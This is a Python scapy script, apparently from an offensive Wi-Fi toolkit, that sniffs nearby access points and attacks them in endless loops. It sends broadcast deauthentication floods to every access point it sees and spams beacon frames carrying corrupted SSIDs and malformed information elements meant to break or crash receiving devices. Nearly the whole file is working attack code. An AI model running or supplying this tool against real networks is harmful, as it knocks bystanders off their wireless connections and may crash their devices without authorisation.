from scapy.all import *
import os
import threading
import random
from FreewayTools.colors import cprint, wprint, cinput, ColorCodes
from Arsenal.DN.dn_utils import PacketHandler
import datetime

stop_event = threading.Event()

def generate_corrupted_ssids(count):
    ssids = []
    for _ in range(count):
        length = random.randint(1, 32)
        ssid_bytes = bytearray()
        i = 0
        while i < length:
            remaining = length - i
            byte_type = random.choice([
                'random', 'null', 'control', 'extended',
                'directional', 'emoji', 'combining', 'overlong_utf8'
            ])
            
            if byte_type == 'random' and remaining >=1:
                ssid_bytes.append(random.randint(0, 255))
                i += 1

            elif byte_type == 'null' and remaining >=1:
                ssid_bytes.append(0)
                i +=1

            elif byte_type == 'control' and remaining >=1:
                ssid_bytes.append(random.choice(list(range(0,32)) + [127]))
                i +=1

            elif byte_type == 'extended' and remaining >=1:
                ssid_bytes.append(random.randint(128,255))
                i +=1

            elif byte_type == 'directional' and remaining >=3:
                ssid_bytes.extend([0xE2, 0x80, 0xAE])
                i +=3

            elif byte_type == 'emoji' and remaining >=4:
                ssid_bytes.extend([0xF0, 0x9F, 0x98, 0x81])
                i +=4

            elif byte_type == 'combining' and remaining >=1:
                ssid_bytes.append(random.randint(128,255))
                i +=1

            elif byte_type == 'overlong_utf8' and remaining >=2:
                ssid_bytes.extend([0xC0, 0xAF])
                i +=2

            else:
                ssid_bytes.append(random.randint(0,255))
                i +=1

        ssid = ssid_bytes.decode('latin1')
        ssids.append(ssid)
    return ssids

def generate_corrupted_information_elements():
    corrupted_ies = []
    
    # Corrupted SSID IE
    corrupted_ssid = generate_corrupted_ssids(1)[0]
    corrupted_ies.append(Dot11Elt(ID="SSID", info=corrupted_ssid))
    
    # Duplicated SSID IE
    corrupted_ies.append(Dot11Elt(ID="SSID", info=corrupted_ssid))
    
    # Oversized RSN IE
    rsn_malformed = Dot11Elt(ID="RSNinfo", info=(
        b'\x01\x00'                # RSN Version
        b'\x00\x0f\xac\x02'        # Group Cipher Suite (invalid)
        b'\x02\x00'                # Pairwise Cipher Suite Count
        b'\x00\x0f\xac\x04'        # Pairwise Cipher Suite List (invalid)
        b'\x01\x00'                # Authentication Suite Count
        b'\x00\x0f\xac\x02'        # Authentication Suite List (invalid)
        b'\xff\xff\xff\xff'        # Invalid field
    ))
    corrupted_ies.append(rsn_malformed)
    
    corrupted_ies.append(Dot11Elt(ID="Vendor", info=RandString(size=random.randint(10, 50))))
    corrupted_ies.append(Dot11Elt(ID=32, info=b'\x01\x02\x03\x04\x05'))  # ID 32 is Power Constraint
    corrupted_ies.append(Dot11Elt(ID="Vendor", info=b'\xC0\xAF' * 10))
    combining_ssid = generate_corrupted_ssids(1)[0]
    corrupted_ies.append(Dot11Elt(ID="SSID", info=combining_ssid))
    corrupted_ies.append(Dot11Elt(ID=200, info=RandString(size=20)))  # ID 200 is undefined
    
    return corrupted_ies

class BSD:
    def __init__(self, interface):
        self.interface = interface
        self.death_note = []
        self.APs = {}
        self.Clients = {}
        self.packet_handler = PacketHandler(self.APs, self.Clients)
        self.init_monitor_mode()
        sniff_thread = threading.Thread(target=self.sniff_aps)
        sniff_thread.start()

    def process_packet(self, packet):
        timestamp = datetime.datetime.now().strftime('%m-%d %H:%M:%S')
        if packet.haslayer(Dot11Beacon):
            self.packet_handler.handle_dot11_beacon(packet, timestamp)
            self.add_to_death_note()

    def add_to_death_note(self, max: int = 20):
        for mac, datadict in self.APs.items():
            if mac not in self.Clients:
                if mac not in self.death_note:
                    self.death_note.append(mac)
                if len(self.death_note) > max:
                    self.death_note = []

    def sniff_aps(self):
        try:
            cprint("Starting to sniff for APs...")
            for interface in self.interface:
                sniff(iface=interface, prn=self.process_packet, store=0)
        except OSError as e:
            if e.errno == 100:
                wprint("Network is down..")
                self.sniff_aps()
            else:
                raise
        except Exception as e:
            print(str(e))
            self.sniff_aps()

    def init_monitor_mode(self):
        for interface in self.interface:
            os.system(f"iwconfig {interface} mode monitor")
        cprint("Monitor mode enabled!")
    
    def generate_random_string(self, min_length=5, max_length=20):
        length = random.randint(min_length, max_length)
        return bytes([random.randint(0, 255) for _ in range(length)])

    def send_overloaded_beacon_packet(self, ssid: str):
        """
        Sends an overloaded beacon packet with a corrupted SSID and additional malformed IEs
        """
        try:
            dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=RandMAC(), addr3=RandMAC())
            beacon = Dot11Beacon(cap="ESS+privacy")
            essid = Dot11Elt(ID="SSID", info=ssid)
            corrupted_ies = generate_corrupted_information_elements()
            
            frame = RadioTap()/dot11/beacon/essid
            for ie in corrupted_ies:
                frame /= ie
            
            supported_rates = Dot11Elt(ID="Rates", info=bytes([255, 255, 255]))  # Invalid rates
            frame /= supported_rates
            
            for _ in range(3):
                frame /= Dot11Elt(ID="Vendor", info=self.generate_random_string(10, 30))
            
            for interface in self.interface:
                sendp(frame, iface=interface, inter=0.001, count=4, verbose=False)
            
            cprint(f"Sent overloaded beacon frame with SSID: {ssid}")
        
        except Exception as e:
            wprint(f"Failed to send overloaded beacon frame: {e}")

    def send_deauth_packet_of_death(self, ap_mac):
        dot11 = Dot11(addr1="FF:FF:FF:FF:FF:FF", addr2=ap_mac, addr3=ap_mac)
        reason = Dot11Deauth(reason=7)
        frame = RadioTap()/dot11/reason
        for interface in self.interface:
            sendp(frame, iface=interface, count=random.randint(25,40), inter=0.0001, verbose=False)
        cprint("Sent deauth frame to {}!".format(ap_mac))

    def start(self, threads: int = 1):
        try:
            stop_event.clear()
            if threads > 1:
                for i in range(threads):
                    t = threading.Thread(target=self.deauth_and_bspam)
                    t.daemon = True
                    t.start()
            else:
                self.deauth_and_bspam()

        except KeyboardInterrupt:
            stop_event.set()
            cprint("KeyboardInterrupt detected. Stopping all threads...")
            self.restore_interfaces()
        except Exception as e:
            wprint(f"An error occurred: {e}")

    def deauth_and_bspam(self):
        ssids = generate_corrupted_ssids(1000)
        try:
            threading.Thread(target=self.deauth_jointer).start()
            threading.Thread(target=self.beacon_jointer, args=(ssids,)).start()

        except OSError as e:
            wprint(f"Network error: {e}")

    def deauth_jointer(self):
        try:
            while not stop_event.is_set():
                for ap_mac in self.death_note:
                    self.send_deauth_packet_of_death(ap_mac)
        except Exception as e:
            print(str(e))

    def beacon_jointer(self, ssids):
        try:
            while not stop_event.is_set():
                for ssid in ssids:
                    self.send_overloaded_beacon_packet(ssid)
        except Exception as e:
            print(str(e))

    def restore_interfaces(self):
        for interface in self.interface:
            os.system(f"iwconfig {interface} mode managed")
        cprint("Restored network interfaces to managed mode.")

if __name__ == "__main__":
    try:
        bsd = BSD(["wlan0"])
        bsd.start(threads=1)
    except KeyboardInterrupt:
        stop_event.set()
        cprint("Script terminated by user.")
